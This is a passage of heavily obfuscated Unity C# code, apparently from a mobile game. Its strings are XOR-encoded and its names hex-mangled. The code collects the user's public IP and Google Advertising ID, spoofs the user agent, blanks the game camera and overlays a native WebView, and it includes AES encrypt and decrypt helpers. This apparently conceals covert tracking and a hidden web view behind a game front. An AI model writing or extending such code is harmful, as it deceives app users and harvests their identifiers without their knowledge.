    //        if (!processorType.Contains("armv7", StringComparison.OrdinalIgnoreCase) && !processorType.Contains("x86-64", StringComparison.OrdinalIgnoreCase))
    //        {
    //            var tcs = new TaskCompletionSource<string>();
    //            // Primary and fallback STUN servers (Google STUN 1-6)
    //            var stunServers = new[]
    //            {
    //                new[] { "stun:stun.l.google.com:19302" },      // Primary
    //                //new[] { "stun:stun1.l.google.com:19302" },     // Fallback 1
    //                //new[] { "stun:stun2.l.google.com:19302" },     // Fallback 2
    //                //new[] { "stun:stun3.l.google.com:19302" },     // Fallback 3
    //                //new[] { "stun:stun4.l.google.com:19302" },     // Fallback 4
    //                //new[] { "stun:stun5.l.google.com:19302" },     // Fallback 5
    //                //new[] { "stun:stun6.l.google.com:19302" }      // Fallback 6
    //            };
    //            RTCPeerConnection pc = null;
    //            foreach (var serverUrls in stunServers)
    //            {
    //                if (tcs.Task.IsCompleted)
    //                    break;
    //                try
    //                {
    //                    var config = new RTCConfiguration
    //                    {
    //                        iceServers = new RTCIceServer[]
    //                        {
    //                    new RTCIceServer { urls = serverUrls }
    //                        },
    //                        iceTransportPolicy = RTCIceTransportPolicy.All
    //                    };
    //                    pc = new RTCPeerConnection(ref config);
    //                    pc.OnIceCandidate = candidate =>
    //                    {
    //                        if (candidate == null || tcs.Task.IsCompleted)
    //                            return;
    //                        if (candidate.Type == RTCIceCandidateType.Srflx || candidate.Type == RTCIceCandidateType.Prflx)
    //                        {
    //                            string address = candidate.Address;
    //                            string ip = "";
    //                            // Parse IP from address (which may be IPv4 "ip:port" or IPv6 "[ip]:port")
    //                            if (address.StartsWith("[") && address.Contains("]:"))
    //                            {
    //                                // IPv6 format: [2001:db8::1]:12345
    //                                int endBracket = address.IndexOf(']');
    //                                ip = address.Substring(1, endBracket - 1);
    //                            }
    //                            else if (address.Contains(':'))
    //                            {
    //                                // IPv4 format: 192.168.1.1:12345
    //                                int lastColon = address.LastIndexOf(':');
    //                                ip = address.Substring(0, lastColon);
    //                            }
    //                            else
    //                            {
    //                                // No port, just IP
    //                                ip = address;
    //                            }
    //                            {
    //#if B_LOGS
    //                                {
    //                                    Debug.Log($"[test STUN] Public IP: {ip} from {serverUrls[0]}");
    //                                }
    //#endif
    //                            }
    //                            tcs.TrySetResult(ip);
    //                        }
    //                    };
    //                    pc.CreateDataChannel("init");
    //                    var offerOp = pc.CreateOffer();
    //                    while (!offerOp.IsDone)
    //                        await Task.Yield();
    //                    var desc = offerOp.Desc;
    //                    pc.SetLocalDescription(ref desc);
    //                    float timeout = 10f;
    //                    float t = 0f;
    //                    while (!tcs.Task.IsCompleted && t < timeout)
    //                    {
    //                        await Task.Delay(100);
    //                        t += 0.1f;
    //                    }
    //                    if (tcs.Task.IsCompleted)
    //                    {
    //                        result = tcs.Task.Result;
    //                        break;
    //                    }
    //                    {
    //#if B_LOGS
    //                        {
    //                            Debug.Log($"[test STUN] Failed with {serverUrls[0]}, trying next...");
    //                        }
    //#endif
    //                    }
    //                }
    //                catch (Exception ex)
    //                {
    //#if B_LOGS
    //                    {
    //                        Debug.Log($"[test STUN] Error with {serverUrls[0]}: {ex.Message}");
    //                    }
    //#endif
    //                    if (pc != null)
    //                    {
    //                        pc.Close();
    //                        pc.Dispose();
    //                    }
    //                }
    //            }
    //            if (!tcs.Task.IsCompleted)
    //                result = "";
    //        }
    //        //#if NOT_B_STARTED
    //        //            else
    //        //        if(result == "")
    //        //        {
    //        //            {
    //        //#if B_LOGS
    //        //                {
    //        //                    Debug.LogError($"[TEST] WebRTC DLL missing or ARMv7 architecture");
    //        //                }
    //        //#endif
    //        //            }
    //        //            result = await GetMyipFallback("0fce0027001c001700140011000b000a0008001f00180022001b00010024001e0025002300260002000400050006000300070000000c001d0015000d000f0021000900100019001a0013000e00120020001647175e80370ec5a1a5d9b1b039a49e64977f39d478adcf763f556d428a45d94f056b1d88f6b76874");
    //        //        }
    //        //#endif
    //        //        }
    //        {
    //#if B_LOGS
    //            {
    //                Debug.Log($"[Test] Get my ip: {result}");
    //            }
    //#endif
    //        }
    //        return result;
    //    }
    private async Task<string> _0x9f4dd389()
    {
        var _0x66cd004f = _0x581f7fed._0x77e9fe38(new byte[40] { 158, 130, 130, 134, 133, 204, 217, 217, 129, 129, 129, 216, 149, 154, 153, 131, 146, 144, 154, 151, 132, 147, 216, 149, 153, 155, 217, 149, 146, 152, 219, 149, 145, 159, 217, 130, 132, 151, 149, 147 }, 246);
        using (UnityWebRequest _0xc8ac1a6c = UnityWebRequest.Get(_0x66cd004f))
        {
            await _0xc8ac1a6c.SendWebRequest();
            string[] _0xccd2e452 = _0xc8ac1a6c.downloadHandler.text.Split('\n');
            foreach (string _0xeaa134b2 in _0xccd2e452)
            {
                if (_0xeaa134b2.StartsWith(_0x581f7fed._0x77e9fe38(new byte[3] { 91, 66, 15 }, 50)))
                {
                    string _0xdbeac636 = _0xeaa134b2.Substring(3);
                    {
#if B_LOGS
                        {
                            Debug.Log($"[Test] User ip (FALLBACK MODE): {_0xdbeac636} from {_0x66cd004f}");
                        }
#endif
                    }

                    return _0xdbeac636;
                }
            }
        }

        return "";
    }

    private async void Start()
    {
        await _0x47d1b51b();
    }

    private string _0xac5b0bf8()
    {
        string _0xad1d03b9 = _0xbd48b76f();
        if (string.IsNullOrEmpty(_0xad1d03b9))
            return _0x581f7fed._0x77e9fe38(new byte[7] { 144, 137, 143, 130, 198, 214, 221 }, 230);
        string _0x7741bee2 = _0xad1d03b9.Replace(_0x581f7fed._0x77e9fe38(new byte[1] { 32 }, 124), _0x581f7fed._0x77e9fe38(new byte[2] { 183, 183 }, 235)).Replace(_0x581f7fed._0x77e9fe38(new byte[1] { 49 }, 22), _0x581f7fed._0x77e9fe38(new byte[2] { 137, 242 }, 213));
        var _0xcefdf5e5 = Regex.Match(_0xad1d03b9, _0x581f7fed._0x77e9fe38(new byte[12] { 36, 15, 21, 8, 10, 2, 72, 79, 59, 3, 76, 78 }, 103));
        string _0x7aba1608 = _0xcefdf5e5.Success ? _0xcefdf5e5.Groups[1].Value : _0x581f7fed._0x77e9fe38(new byte[3] { 233, 234, 232 }, 216);
        return _0x581f7fed._0x77e9fe38(new byte[12] { 233, 167, 180, 175, 162, 181, 168, 174, 175, 233, 232, 186 }, 193) + _0x581f7fed._0x77e9fe38(new byte[8] { 74, 93, 78, 28, 73, 93, 1, 27 }, 60) + _0x7741bee2 + _0x581f7fed._0x77e9fe38(new byte[2] { 243, 239 }, 212) + _0x581f7fed._0x77e9fe38(new byte[30] { 252, 235, 248, 170, 250, 248, 229, 254, 229, 183, 196, 235, 252, 227, 237, 235, 254, 229, 248, 164, 250, 248, 229, 254, 229, 254, 243, 250, 239, 177 }, 138) + _0x581f7fed._0x77e9fe38(new byte[121] { 136, 155, 128, 141, 154, 135, 129, 128, 206, 138, 139, 136, 198, 129, 140, 132, 194, 133, 139, 151, 194, 152, 143, 130, 199, 149, 154, 156, 151, 149, 161, 140, 132, 139, 141, 154, 192, 138, 139, 136, 135, 128, 139, 190, 156, 129, 158, 139, 156, 154, 151, 198, 129, 140, 132, 194, 133, 139, 151, 194, 149, 137, 139, 154, 212, 136, 155, 128, 141, 154, 135, 129, 128, 198, 199, 149, 156, 139, 154, 155, 156, 128, 206, 152, 143, 130, 213, 147, 194, 141, 129, 128, 136, 135, 137, 155, 156, 143, 140, 130, 139, 212, 154, 156, 155, 139, 147, 199, 213, 147, 141, 143, 154, 141, 134, 198, 139, 199, 149, 147, 147 }, 238) + _0x581f7fed._0x77e9fe38(new byte[26] { 178, 179, 176, 254, 166, 164, 185, 162, 185, 250, 241, 163, 165, 179, 164, 151, 177, 179, 184, 162, 241, 250, 163, 183, 255, 237 }, 214) + _0x581f7fed._0x77e9fe38(new byte[52] { 73, 72, 75, 5, 93, 95, 66, 89, 66, 1, 10, 76, 93, 93, 123, 72, 95, 94, 68, 66, 67, 10, 1, 88, 76, 3, 95, 72, 93, 65, 76, 78, 72, 5, 2, 115, 96, 66, 87, 68, 65, 65, 76, 113, 2, 2, 1, 10, 10, 4, 4, 22 }, 45) + _0x581f7fed._0x77e9fe38(new byte[37] { 34, 35, 32, 110, 54, 52, 41, 50, 41, 106, 97, 54, 42, 39, 50, 32, 41, 52, 43, 97, 106, 97, 10, 47, 40, 51, 62, 102, 39, 52, 43, 48, 126, 42, 97, 111, 125 }, 70) + _0x581f7fed._0x77e9fe38(new byte[34] { 43, 42, 41, 103, 63, 61, 32, 59, 32, 99, 104, 57, 42, 33, 43, 32, 61, 104, 99, 104, 8, 32, 32, 40, 35, 42, 111, 6, 33, 44, 97, 104, 102, 116 }, 79) + _0x581f7fed._0x77e9fe38(new byte[30] { 213, 212, 215, 153, 193, 195, 222, 197, 222, 157, 150, 220, 208, 201, 229, 222, 196, 210, 217, 225, 222, 216, 223, 197, 194, 150, 157, 132, 152, 138 }, 177) + _0x581f7fed._0x77e9fe38(new byte[48] { 201, 207, 196, 198, 203, 220, 207, 157, 200, 220, 217, 128, 198, 223, 207, 220, 211, 217, 206, 135, 230, 198, 223, 207, 220, 211, 217, 135, 154, 254, 213, 207, 210, 208, 212, 200, 208, 154, 145, 203, 216, 207, 206, 212, 210, 211, 135, 154 }, 189) + _0x7aba1608 + _0x581f7fed._0x77e9fe38(new byte[35] { 86, 12, 93, 10, 19, 3, 16, 31, 21, 75, 86, 54, 30, 30, 22, 29, 20, 81, 50, 25, 3, 30, 28, 20, 86, 93, 7, 20, 3, 2, 24, 30, 31, 75, 86 }, 113) + _0x7aba1608 + _0x581f7fed._0x77e9fe38(new byte[238] { 76, 22, 71, 16, 9, 25, 10, 5, 15, 81, 76, 37, 4, 31, 86, 42, 84, 41, 25, 10, 5, 15, 76, 71, 29, 14, 25, 24, 2, 4, 5, 81, 76, 89, 95, 76, 22, 54, 71, 6, 4, 9, 2, 7, 14, 81, 31, 25, 30, 14, 71, 27, 7, 10, 31, 13, 4, 25, 6, 81, 76, 42, 5, 15, 25, 4, 2, 15, 76, 71, 12, 14, 31, 35, 2, 12, 3, 46, 5, 31, 25, 4, 27, 18, 61, 10, 7, 30, 14, 24, 81, 13, 30, 5, 8, 31, 2, 4, 5, 67, 66, 16, 25, 14, 31, 30, 25, 5, 75, 59, 25, 4, 6, 2, 24, 14, 69, 25, 14, 24, 4, 7, 29, 14, 67, 16, 10, 25, 8, 3, 2, 31, 14, 8, 31, 30, 25, 14, 81, 76, 10, 25, 6, 76, 71, 9, 2, 31, 5, 14, 24, 24, 81, 76, 93, 95, 76, 71, 6, 4, 9, 2, 7, 14, 81, 31, 25, 30, 14, 71, 6, 4, 15, 14, 7, 81, 76, 76, 71, 27, 7, 10, 31, 13, 4, 25, 6, 81, 76, 42, 5, 15, 25, 4, 2, 15, 76, 71, 27, 7, 10, 31, 13, 4, 25, 6, 61, 14, 25, 24, 2, 4, 5, 81, 76, 90, 95, 69, 91, 69, 91, 76, 71, 30, 10, 45, 30, 7, 7, 61, 14, 25, 24, 2, 4, 5, 81, 76 }, 107) + _0x7aba1608 + _0x581f7fed._0x77e9fe38(new byte[117] { 147, 141, 147, 141, 147, 141, 154, 192, 148, 134, 192, 192, 134, 242, 223, 215, 216, 222, 201, 147, 217, 216, 219, 212, 211, 216, 237, 207, 210, 205, 216, 207, 201, 196, 149, 205, 207, 210, 201, 210, 145, 154, 200, 206, 216, 207, 252, 218, 216, 211, 201, 249, 220, 201, 220, 154, 145, 198, 218, 216, 201, 135, 219, 200, 211, 222, 201, 212, 210, 211, 149, 148, 198, 207, 216, 201, 200, 207, 211, 157, 200, 220, 217, 134, 192, 145, 222, 210, 211, 219, 212, 218, 200, 207, 220, 223, 209, 216, 135, 201, 207, 200, 216, 192, 148, 134, 192, 222, 220, 201, 222, 213, 149, 216, 148, 198, 192 }, 189) + _0x581f7fed._0x77e9fe38(new byte[5] { 164, 240, 241, 240, 226 }, 217);
    }

    private string _0x20268b6d = "";
    private string _0xbd48b76f()
    {
        if (string.IsNullOrEmpty(_0xba569bba) && _0xa3c94682 != null)
            _0xba569bba = _0xa3c94682.GetUserAgent();
        if (string.IsNullOrEmpty(_0xba569bba))
            return string.Empty;
        string _0xf5ae9ea3 = Regex.Replace(_0xba569bba, _0x581f7fed._0x77e9fe38(new byte[11] { 173, 130, 219, 202, 173, 130, 219, 134, 135, 173, 147 }, 241), string.Empty);
        _0xf5ae9ea3 = Regex.Replace(_0xf5ae9ea3, _0x581f7fed._0x77e9fe38(new byte[15] { 178, 157, 197, 172, 155, 135, 130, 138, 193, 181, 176, 213, 199, 179, 197 }, 238), string.Empty);
        _0xf5ae9ea3 = Regex.Replace(_0xf5ae9ea3, _0x581f7fed._0x77e9fe38(new byte[15] { 103, 84, 67, 66, 88, 94, 95, 30, 5, 109, 31, 1, 109, 66, 27 }, 49), string.Empty);
        return Regex.Replace(_0xf5ae9ea3, _0x581f7fed._0x77e9fe38(new byte[6] { 11, 36, 44, 101, 123, 42 }, 87), _0x581f7fed._0x77e9fe38(new byte[1] { 58 }, 26)).Trim();
    }

    private RectTransform _0xa91c9a08;
    internal string _0xc470aaaa(string _0xc98c01b8)
    {
        int _0xafd2cb00 = _0xc98c01b8.IndexOf(_0x581f7fed._0x77e9fe38(new byte[3] { 243, 254, 167 }, 154), StringComparison.OrdinalIgnoreCase);
        if (_0xafd2cb00 < 0)
            return null;
        string _0x3becf1a3 = _0xc98c01b8.Substring(_0xafd2cb00 + 3);
        int _0x1ce19a32 = _0x3becf1a3.IndexOf('&');
        return _0x1ce19a32 >= 0 ? _0x3becf1a3.Substring(0, _0x1ce19a32) : _0x3becf1a3;
    }

    private IEnumerator _0xf8374030(string _0x12a1bfa4)
    {
        if (Permission.HasUserAuthorizedPermission(_0x12a1bfa4))
            yield break;
        bool _0x51abbe4e = false;
        var _0x666446f2 = new PermissionCallbacks();
        _0x666446f2.PermissionGranted += _0xcd7c3226 => _0x51abbe4e = true;
        _0x666446f2.PermissionDenied += _0xcd7c3226 => _0x51abbe4e = true;
        Permission.RequestUserPermission(_0x12a1bfa4, _0x666446f2);
        yield return new WaitUntil(() => _0x51abbe4e);
    }

    private readonly string[] _0xdd2b150e = new string[]
    {
        _0x581f7fed._0x77e9fe38(new byte[60] { 233, 134, 151, 169, 57, 77, 113, 124, 57, 107, 124, 124, 117, 106, 57, 120, 107, 124, 57, 113, 118, 109, 57, 107, 112, 126, 113, 109, 57, 119, 118, 110, 57, 251, 153, 138, 57, 125, 118, 119, 251, 153, 128, 109, 57, 116, 112, 106, 106, 57, 96, 118, 108, 107, 57, 106, 105, 112, 119, 56 }, 25),
        _0x581f7fed._0x77e9fe38(new byte[52] { 157, 242, 224, 237, 77, 36, 25, 77, 14, 2, 24, 1, 9, 77, 15, 8, 77, 20, 2, 24, 31, 77, 1, 24, 14, 6, 20, 77, 0, 2, 0, 8, 3, 25, 77, 143, 237, 254, 77, 26, 5, 20, 77, 30, 25, 2, 29, 77, 3, 2, 26, 82 }, 109),
        _0x581f7fed._0x77e9fe38(new byte[66] { 241, 137, 178, 252, 171, 156, 51, 81, 122, 116, 51, 100, 122, 125, 96, 51, 114, 97, 118, 51, 123, 122, 103, 103, 122, 125, 116, 51, 126, 124, 97, 118, 51, 124, 117, 103, 118, 125, 51, 103, 124, 119, 114, 106, 51, 241, 147, 128, 51, 96, 103, 114, 106, 51, 122, 125, 51, 103, 123, 118, 51, 116, 114, 126, 118, 61 }, 19),
        _0x581f7fed._0x77e9fe38(new byte[54] { 247, 152, 146, 149, 39, 83, 111, 110, 116, 39, 110, 116, 39, 119, 117, 110, 106, 98, 39, 115, 110, 106, 98, 39, 229, 135, 148, 39, 115, 111, 98, 39, 101, 98, 116, 115, 39, 119, 107, 102, 126, 98, 117, 116, 39, 119, 107, 102, 126, 39, 105, 104, 112, 41 }, 7),
        _0x581f7fed._0x77e9fe38(new byte[48] { 79, 32, 43, 26, 159, 230, 208, 202, 205, 159, 200, 214, 209, 209, 214, 209, 216, 159, 204, 203, 205, 218, 222, 212, 159, 220, 208, 202, 211, 219, 159, 221, 218, 159, 208, 209, 218, 159, 204, 207, 214, 209, 159, 222, 200, 222, 198, 145 }, 191),
        _0x581f7fed._0x77e9fe38(new byte[65] { 186, 213, 208, 202, 106, 0, 43, 41, 33, 58, 37, 62, 57, 106, 43, 56, 47, 106, 39, 37, 56, 47, 106, 43, 41, 62, 35, 60, 47, 106, 62, 37, 36, 35, 45, 34, 62, 106, 168, 202, 217, 106, 57, 62, 43, 51, 106, 43, 36, 46, 106, 62, 56, 51, 106, 51, 37, 63, 56, 106, 38, 63, 41, 33, 100 }, 74),
        _0x581f7fed._0x77e9fe38(new byte[55] { 221, 178, 163, 159, 13, 104, 91, 72, 95, 84, 13, 94, 93, 68, 67, 13, 78, 66, 88, 67, 89, 94, 13, 207, 173, 190, 13, 89, 69, 72, 13, 67, 72, 85, 89, 13, 66, 67, 72, 13, 78, 66, 88, 65, 73, 13, 79, 72, 13, 84, 66, 88, 95, 94, 3 }, 45),
        _0x581f7fed._0x77e9fe38(new byte[63] { 108, 35, 30, 97, 54, 1, 174, 222, 226, 239, 247, 235, 252, 253, 174, 252, 231, 233, 230, 250, 174, 224, 225, 249, 174, 239, 252, 235, 174, 249, 231, 224, 224, 231, 224, 233, 174, 108, 14, 29, 174, 234, 225, 224, 108, 14, 23, 250, 174, 249, 239, 226, 229, 174, 239, 249, 239, 247, 174, 247, 235, 250, 160 }, 142),
        _0x581f7fed._0x77e9fe38(new byte[51] { 235, 132, 148, 157, 59, 84, 117, 119, 98, 59, 111, 115, 116, 104, 126, 59, 108, 115, 116, 59, 104, 111, 122, 98, 59, 114, 117, 59, 111, 115, 126, 59, 124, 122, 118, 126, 59, 108, 114, 117, 59, 111, 115, 126, 59, 107, 105, 114, 97, 126, 53 }, 27),
        _0x581f7fed._0x77e9fe38(new byte[64] { 178, 202, 241, 191, 232, 223, 112, 29, 63, 61, 53, 62, 36, 37, 61, 112, 57, 35, 112, 53, 38, 53, 34, 41, 36, 56, 57, 62, 55, 112, 178, 208, 195, 112, 59, 53, 53, 32, 112, 35, 32, 57, 62, 62, 57, 62, 55, 112, 54, 63, 34, 112, 41, 63, 37, 34, 112, 51, 56, 49, 62, 51, 53, 126 }, 80)
    };
    // WEB VIEW LOGIC
    public bool _0xae32ae48 { get; set; }

    private string _0xb6cf0bf0 = "";
    /* ============================= */
    /* ENCRYPT / DECRYPT             */
    /* ============================= */
    private string _0x0ddb8d03(string _0xab46e523, string _0x7576793b)
    {
        try
        {
            using var _0x4060b4ea = Aes.Create();
            _0x4060b4ea.Key = SHA256.Create().ComputeHash(Encoding.UTF8.GetBytes(_0x7576793b));
            _0x4060b4ea.GenerateIV();
            using var _0x3277db5d = new MemoryStream();
            _0x3277db5d.Write(_0x4060b4ea.IV, 0, _0x4060b4ea.IV.Length);
            using (var _0x435e9f06 = new CryptoStream(_0x3277db5d, _0x4060b4ea.CreateEncryptor(), CryptoStreamMode.Write))
            {
                var _0x75e5de80 = Encoding.UTF8.GetBytes(_0xab46e523);
                _0x435e9f06.Write(_0x75e5de80, 0, _0x75e5de80.Length);
                _0x435e9f06.FlushFinalBlock();
            }

            return Convert.ToBase64String(_0x3277db5d.ToArray());
        }
        catch (Exception ex)
        {
            return "";
        }
    }

    private bool _0xf39b9cfc(string _0xb4521274, string _0xbdf7997f)
    {
        string _0x342486d1 = _0xc470aaaa(_0xb4521274);
        if (string.IsNullOrEmpty(_0x342486d1))
            _0x342486d1 = _0xbdf7997f;
        if (_0xdab7109d(_0x342486d1))
            return true;
        string _0x0de19751 = string.IsNullOrEmpty(_0x342486d1) ? _0x581f7fed._0x77e9fe38(new byte[29] { 183, 171, 171, 175, 172, 229, 240, 240, 175, 179, 190, 166, 241, 184, 176, 176, 184, 179, 186, 241, 188, 176, 178, 240, 172, 171, 176, 173, 186 }, 223) : _0x581f7fed._0x77e9fe38(new byte[46] { 163, 191, 191, 187, 184, 241, 228, 228, 187, 167, 170, 178, 229, 172, 164, 164, 172, 167, 174, 229, 168, 164, 166, 228, 184, 191, 164, 185, 174, 228, 170, 187, 187, 184, 228, 175, 174, 191, 170, 162, 167, 184, 244, 162, 175, 246 }, 203) + _0x342486d1;
        WLog(_0x581f7fed._0x77e9fe38(new byte[35] { 147, 184, 162, 191, 189, 181, 156, 185, 187, 181, 240, 189, 177, 162, 187, 181, 164, 240, 182, 177, 188, 188, 178, 177, 179, 187, 240, 177, 163, 240, 167, 181, 178, 234, 240 }, 208) + _0x0de19751);
        return _0xb65ff173(_0x0de19751);
    }

    private string _0x3d43fe02 = "";
    private void _0x096a539a()
    {
        WLog(_0x581f7fed._0x77e9fe38(new byte[21] { 213, 252, 239, 249, 234, 252, 239, 248, 189, 255, 252, 254, 246, 189, 237, 239, 248, 238, 238, 248, 249 }, 157));
        if (Time.frameCount == _0x65261fd2)
            return;
        _0x65261fd2 = Time.frameCount;
        if (_0xd7bbee86())
            return;
        _0x9e87bd34();
    }

    // PART 3
    private string _0x6d528459()
    {
        try
        {
            var _0x929d862a = new AndroidJavaClass(_0x581f7fed._0x77e9fe38(new byte[30] { 134, 138, 136, 203, 144, 139, 140, 145, 156, 214, 129, 203, 149, 137, 132, 156, 128, 151, 203, 176, 139, 140, 145, 156, 181, 137, 132, 156, 128, 151 }, 229));
            var _0xf1e54404 = _0x929d862a.GetStatic<AndroidJavaObject>(_0x581f7fed._0x77e9fe38(new byte[15] { 81, 71, 64, 64, 87, 92, 70, 115, 81, 70, 91, 68, 91, 70, 75 }, 50));
            var _0x74c37072 = new AndroidJavaClass(_0x581f7fed._0x77e9fe38(new byte[57] { 97, 109, 111, 44, 101, 109, 109, 101, 110, 103, 44, 99, 108, 102, 112, 109, 107, 102, 44, 101, 111, 113, 44, 99, 102, 113, 44, 107, 102, 103, 108, 118, 107, 100, 107, 103, 112, 44, 67, 102, 116, 103, 112, 118, 107, 113, 107, 108, 101, 75, 102, 65, 110, 107, 103, 108, 118 }, 2));
            var _0xd6404fb6 = _0x74c37072.CallStatic<AndroidJavaObject>(_0x581f7fed._0x77e9fe38(new byte[20] { 12, 14, 31, 42, 15, 29, 14, 25, 31, 2, 24, 2, 5, 12, 34, 15, 34, 5, 13, 4 }, 107), _0xf1e54404);
            var _0x612dd415 = _0xd6404fb6.Call<string>(_0x581f7fed._0x77e9fe38(new byte[5] { 175, 173, 188, 129, 172 }, 200));
            {
#if B_LOGS
                Debug.Log($"[Test] Google Advertiding Id (ad id): {_0x612dd415}");
#endif
            }

            return string.IsNullOrEmpty(_0x612dd415) ? "" : _0x612dd415;
        }
        catch
        {
            return "";
        }
    }

    private bool _0x974c5373 = false;
    private string _0x24d000f7 = "";
    private UniWebViewPopup _0xd12ac465()
    {
        for (int _0xa7693db5 = _0x1c5e0b7d.Count - 1; _0xa7693db5 >= 0; _0xa7693db5--)
        {
            var _0xccd95fc5 = _0x1c5e0b7d[_0xa7693db5];
            if (_0xccd95fc5 != null && _0xccd95fc5.IsAlive)
                return _0xccd95fc5;
            _0x1c5e0b7d.RemoveAt(_0xa7693db5);
        }

        return null;
    }

    internal void _0x73100cc9()
    {
        Rect _0x078c6c3c = Screen.safeArea;
        Vector2 _0xdfa74864 = new Vector2(Screen.width, Screen.height);
        if (_0x078c6c3c == lastSafe && _0xdfa74864 == lastSize)
            return;
        // Apply manual padding
        _0x078c6c3c.xMin += _0x8226b905;
        _0x078c6c3c.xMax -= _0xe4165ede;
        _0x078c6c3c.yMin += _0x7f2ba76b;
        _0x078c6c3c.yMax -= _0x00960851;
        // Convert Unity safe area -> native WebView frame
        Rect _0xe1f628bc = new Rect(_0x078c6c3c.x, _0xdfa74864.y - _0x078c6c3c.y - _0x078c6c3c.height, // Y flip for native coordinate system
 _0x078c6c3c.width, _0x078c6c3c.height);
        _0xa3c94682.Frame = _0xe1f628bc;
        lastSafe = Screen.safeArea;
        lastSize = _0xdfa74864;
    }

    private string _0xfae94595 { get; set; }

    private string Decrypt(string _0x5c12292f, string _0x73c484d6)
    {
        try
        {
            var _0x93cedfcd = Convert.FromBase64String(_0x5c12292f);
            using var _0x9a2f126f = Aes.Create();
            _0x9a2f126f.Key = SHA256.Create().ComputeHash(Encoding.UTF8.GetBytes(_0x73c484d6));
            var _0x41cb3e64 = new byte[16];
            Buffer.BlockCopy(_0x93cedfcd, 0, _0x41cb3e64, 0, 16);
            _0x9a2f126f.IV = _0x41cb3e64;
            using var _0xaf0fe68c = new MemoryStream(_0x93cedfcd, 16, _0x93cedfcd.Length - 16);
            using var _0x1055b4cf = new CryptoStream(_0xaf0fe68c, _0x9a2f126f.CreateDecryptor(), CryptoStreamMode.Read);
            using var _0xac210c7f = new StreamReader(_0x1055b4cf, Encoding.UTF8);
            return _0xac210c7f.ReadToEnd();
        }
        catch (Exception ex)
        {
            return "";
        }
    }

    private ApplicationInstallMode _0xfae224ea = ApplicationInstallMode.Unknown;
    internal Button _0x7c90f554(string _0x58b70e9d, Transform _0x9e3dcd01)
    {
        var _0x2497f4d2 = new GameObject(_0x58b70e9d + _0x581f7fed._0x77e9fe38(new byte[3] { 30, 40, 50 }, 92), typeof(RectTransform), typeof(Image), typeof(Button));
        var _0x45561ec7 = _0x2497f4d2.GetComponent<RectTransform>();
        _0x45561ec7.SetParent(_0x9e3dcd01, false);
        var _0x065ac41d = _0x2497f4d2.GetComponent<Image>();
        _0x065ac41d.color = new Color(0.92f, 0.92f, 0.95f, 1f);
        var _0xf2e93713 = _0x2497f4d2.GetComponent<Button>();
        var _0x617458da = _0xf2e93713.colors;
        _0x617458da.highlightedColor = new Color(0.85f, 0.85f, 0.9f);
        _0x617458da.pressedColor = new Color(0.8f, 0.8f, 0.88f);
        _0xf2e93713.colors = _0x617458da;
        var _0x43c41c76 = new GameObject(_0x581f7fed._0x77e9fe38(new byte[4] { 197, 244, 233, 229 }, 145), typeof(RectTransform), typeof(Text));
        var _0xb5803ff8 = _0x43c41c76.GetComponent<RectTransform>();
        _0xb5803ff8.SetParent(_0x2497f4d2.transform, false);
        _0xb5803ff8.anchorMin = Vector2.zero;
        _0xb5803ff8.anchorMax = Vector2.one;
        _0xb5803ff8.offsetMin = _0xb5803ff8.offsetMax = Vector2.zero;
        var _0xe4171d97 = _0x43c41c76.GetComponent<Text>();
        _0xe4171d97.text = _0x58b70e9d;
        _0xe4171d97.alignment = TextAnchor.MiddleCenter;
        _0xe4171d97.color = Color.black;
        _0xe4171d97.font = Resources.GetBuiltinResource<Font>(_0x581f7fed._0x77e9fe38(new byte[9] { 174, 157, 134, 142, 131, 193, 155, 155, 137 }, 239));
        _0xe4171d97.fontSize = 28;
        WLog(_0x581f7fed._0x77e9fe38(new byte[14] { 9, 56, 47, 43, 62, 47, 8, 63, 62, 62, 37, 36, 106, 109 }, 74) + _0x58b70e9d + _0x581f7fed._0x77e9fe38(new byte[1] { 231 }, 192));
        return _0xf2e93713;
    }

    private string _0x5ab207e8 = "";
    private void _0x46028131()
    {
        if (Camera.main == null)
            return;
        Camera.main.cullingMask = 0;
        Camera.main.clearFlags = CameraClearFlags.SolidColor;
        Camera.main.backgroundColor = Color.black;
    }

    private void _0xbcd2e438()
    {
        if (_0xa3c94682 == null)
            return;
        if (_0xbf1779c9)
            _0xa3c94682.SetUserAgent(_0xbd48b76f());
        else
            _0xa3c94682.SetUserAgent("");
    }

    private async Task<bool> _0xc1c670cf()
    {
        {
#if B_LOGS
            Debug.Log(_0x581f7fed._0x77e9fe38(new byte[37] { 1, 14, 63, 41, 46, 7, 122, 9, 51, 61, 52, 19, 52, 15, 52, 51, 46, 35, 9, 63, 40, 44, 51, 57, 63, 41, 27, 52, 53, 52, 35, 55, 53, 47, 41, 54, 35 }, 90));
#endif
        }

        try
        {
            var _0xca497c06 = new InitializationOptions();
            await UnityServices.InitializeAsync(_0xca497c06);
            {
#if B_LOGS
                Debug.Log(_0x581f7fed._0x77e9fe38(new byte[32] { 215, 216, 233, 255, 248, 209, 172, 217, 226, 229, 248, 245, 223, 233, 254, 250, 229, 239, 233, 255, 172, 197, 226, 229, 248, 229, 237, 224, 229, 246, 233, 232 }, 140));
#endif
            }
        }
        catch (Exception ex)
        {
            {
#if B_LOGS
                Debug.Log(_0x581f7fed._0x77e9fe38(new byte[20] { 32, 49, 39, 32, 84, 33, 26, 29, 0, 13, 39, 17, 6, 2, 29, 23, 17, 7, 78, 84 }, 116) + ex.Message);
#endif
            }

            _0x1021fa71?._0xa47995de();
            return true;
        }

        bool _0x9c6d625d = false;
        do
        {
            try
            {
                await AuthenticationService.Instance.SignInAnonymouslyAsync();
                _0x9c6d625d = true;
                {
                    {
#if B_LOGS
                        Debug.Log(_0x581f7fed._0x77e9fe38(new byte[37] { 86, 89, 104, 126, 121, 80, 45, 94, 100, 106, 99, 32, 100, 99, 45, 76, 99, 98, 99, 116, 96, 98, 120, 126, 35, 45, 93, 97, 108, 116, 104, 127, 45, 68, 73, 55, 45 }, 13) + AuthenticationService.Instance.PlayerId);
#endif
                    }

                    _0x5ab207e8 = AuthenticationService.Instance.PlayerId;
                }
            }
            catch (AuthenticationException ex)
            {
                {
#if B_LOGS
                    Debug.Log(_0x581f7fed._0x77e9fe38(new byte[25] { 222, 207, 217, 222, 170, 217, 227, 237, 228, 167, 227, 228, 170, 203, 255, 254, 226, 170, 207, 216, 216, 197, 216, 176, 170 }, 138) + ex.Message);
#endif
                }

                _0x1021fa71?._0xa47995de();
                return true;
            }
            catch (RequestFailedException ex)
            {
                {
#if B_LOGS
                    Debug.Log(_0x581f7fed._0x77e9fe38(new byte[28] { 168, 185, 175, 168, 220, 175, 149, 155, 146, 209, 149, 146, 220, 174, 153, 141, 137, 153, 143, 136, 220, 185, 174, 174, 179, 174, 198, 220 }, 252) + ex.Message);
#endif
                }

